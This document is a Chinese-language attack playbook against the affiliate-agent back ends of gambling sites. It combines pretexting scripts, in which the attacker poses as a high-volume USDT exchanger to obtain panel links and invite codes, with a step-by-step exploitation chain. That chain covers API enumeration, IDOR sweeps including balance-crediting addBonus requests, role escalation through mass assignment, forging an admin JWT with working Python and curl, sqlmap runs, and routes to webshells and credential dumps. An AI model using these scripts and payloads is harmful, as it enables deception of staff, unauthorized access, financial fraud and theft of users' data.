# 博彩站代理商社工 + 后台接管杀伤链

> 更新：2026-08-11  
> 工具：`炼蛊房/agent_probe.py`  
> 核心思路：**不硬扫，用商务谈判让对方主动给出代理后台 URL + 账号**

---

## 一、为什么打代理后台

```
权限层级（防护强度递减）：
  Admin ← IP 白名单 + CF + 强密码
  运营商面板 ← 部分 CF，通常有 IP 限制
  ★ 代理商后台 ← 几乎无 IP 限制，注册开放，弱口令
  普通前台 ← 最弱

代理商后台的攻击价值：
  · 可查所有下级用户余额 / 存取款记录（数百/千条）
  · 可调 addBonus / adjustBalance / 转账 API
  · 往往不走 CF（不影响推广，所以不挂 CDN）
  · 泄露佣金结构 → 了解业务规模
  · 账号体系信息 → 为横向到 admin 铺路
  · 很多站：代理 token 与 admin token 同一签名密钥 → JWT 伪造
```

## 三、社工话术模板

### 3.1 前置准备

```
身份设定：高交易量的 USDT 兑换商 / 跨境支付代理
定位：800-2000 笔/天，5-20 万 U/天（真实可信范围）
渠道：TG 私信对方客服/推广 TG 群 / 找到对方 TG Bot 对话
```

---

### 3.2 开场话术（第一条消息）

> 适用：通过 TG 群找到对方工作人员，或从 TG Bot 触发客服

```
您好，我们是辉腾国际（或其他虚构名）的 USDT 兑换团队，
目前主要做东南亚方向的跨境支付和 USDT 兑换业务，
每天流水大概在 5-10 万 U 左右，高峰期能到 20 万。
听朋友介绍说你们这边返佣比较好，想了解一下合作政策？
```

**变体（跨境支付方向）**：
```
你好，我们团队专门做菲律宾/越南方向的跨境收款，
日结算量在 800-1500 笔左右，主要对接博彩和电商平台，
在找稳定的 USDT 出入金合作方，不知道贵平台有没有代理合作？
```

---

### 3.3 推进——询问返佣结构

> 对方表示有兴趣后，自然推进到谈佣金

```
我们这边量比较稳定，主要看两点：
1. 返佣比例怎么算，是流水分成还是按单？
2. 有没有独立的代理后台，方便我们自己看数据和管理子账号？
   我们团队有专人做对账，需要能实时查看入账记录的那种后台。
```

**关键点**：主动提"需要独立后台 / 子账号管理"，对方为了谈成合作，会主动发后台链接。

---

### 3.4 确认合作并要后台

> 对方报佣金（如三七分）后

```
三七分可以接受，我们之前和几家都是这个比例。
那接下来怎么走流程？是先开测试账号还是直接给代理后台注册链接？
我们这边财务需要先看一下后台界面再决定是否接入。
```

---

### 3.5 摸技术栈（铺路）

> 拿到后台链接后，自然追问技术细节

```
你们这个后台是自研的还是第三方框架？
问一下是因为我们对接过一些平台，
有的后台子账号是独立入口，有的是主账号下级，
想确认一下账号体系，方便我们这边做对接准备。
```

## 四、拿到代理后台后的技术利用链

### Phase 1：发现和注册
```bash
# 自动注册代理账号
python3 炼蛊房/agent_probe.py register \
  --base https://agent.target.com \
  --case <案卷>

# 或手动注册（根据社工拿到的注册链接）
# 注意：邀请码填社工过程中对方给的 invite code
```

### Phase 2：登录后 API 枚举
```bash
python3 炼蛊房/agent_probe.py api-enum \
  --base https://agent.target.com \
  --token <登录后的token> \
  --case <案卷>
```

重点关注这些 API 的响应：

| API | 价值 |
|-----|------|
| `/api/agent/members` | 下级用户列表（含 UID/余额）|
| `/api/agent/commission` | 佣金记录（推算业务规模）|
| `/api/agent/config` | 可能泄露签名密钥/JWT secret |
| `/api/agent/settlement` | 结算记录（财务数据）|
| `/api/agent/addBonus` | 直接给用户加款 |
| `/api/agent/adjustBalance` | 余额调整 |

### Phase 3：BOLA / IDOR 测试
```bash
# 遍历其他代理商的 UID，尝试越权读取数据
python3 炼蛊房/agent_probe.py bola \
  --base https://agent.target.com \
  --token <token> \
  --uid-start 1 --uid-end 200 \
  --case <案卷>
```

典型越权目标：
```
GET /api/agent/users?agent_id=<遍历>
GET /api/agent/report?uid=<遍历>
GET /api/agent/balance?agent_id=<遍历>
POST /api/agent/addBonus {"uid": <遍历>, "amount": 0.01}
```

### Phase 4：等级越权（Mass Assignment）
```bash
python3 炼蛊房/agent_probe.py level \
  --base https://agent.target.com \
  --token <token> \
  --case <案卷>
```

尝试把代理账号升级到运营商/admin：
```json
{"level": 99, "role": "admin", "userType": "operator"}
```

### Phase 5：JWT 密钥复用（代理 → Admin）

很多博彩站所有端点共用同一个 JWT secret：

```bash
# 1. 从代理后台的 config/settings API 提取 JWT 密钥
curl -sk -H "Authorization: Bearer <agent_token>" \
  https://agent.target.com/api/agent/config | python3 -m json.tool

# 2. 如果找到 JWT secret，用它签名 admin token
python3 -c "
import jwt
secret = '找到的secret'
payload = {'uid': 1, 'role': 'admin', 'level': 99, 'username': 'admin'}
token = jwt.encode(payload, secret, algorithm='HS256')
print(token)
"

# 3. 用伪造的 admin token 访问主站 admin API
curl -sk -H "Authorization: Bearer <伪造token>" \
  https://target.com/api/admin/users
```

### Phase 6：代理后台 SQL 注入

代理后台通常防护更弱，优先测 SQL 注入：

```bash
# 对代理 API 的查询参数跑 sqlmap
python3 炼蛊房/sqlmap_kit.py run \
  --url "https://agent.target.com/api/agent/report?date=2026-08-01" \
  --cookie "token=<agent_token>" \
  --case <案卷>
```

## 五、横向到 Admin 路径总结

```
代理账号
  ├─ JWT 密钥复用 → 伪造 admin token → 直接访问 admin API
  ├─ 等级越权 (Mass Assignment) → 提升到 operator/admin
  ├─ BOLA → 读取所有用户数据 → 碰撞 admin 密码哈希
  ├─ SQL 注入 → 数据库全量 dump → admin credentials
  ├─ 代理后台 webshell → getshell → 读取配置文件 → admin credentials
  └─ 代理后台环境变量 → DB 连接串 → 直接查 admin 表
```
